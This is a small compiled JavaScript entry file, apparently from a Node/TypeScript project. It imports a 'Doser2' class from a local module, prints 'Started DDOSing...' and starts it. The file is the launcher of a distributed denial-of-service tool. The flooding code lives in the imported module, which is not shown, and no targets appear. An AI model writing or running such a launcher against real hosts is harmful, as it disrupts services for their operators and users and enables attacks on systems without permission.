"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
var doser2_1 = require("./doser2");
// Tutorial: https://khalilstemmler.com/blogs/typescript/node-starter-project/
// https://blog.appsignal.com/2022/01/19/how-to-set-up-a-nodejs-project-with-typescript.html
// const args = process.argv;
// console.log('Script started: ', args);
var timeout = undefined;
function start() {
    var doser = new doser2_1.Doser2(); //32
    console.log('Started DDOSing...');
    doser.start(); //Start DDOSing
}
start();
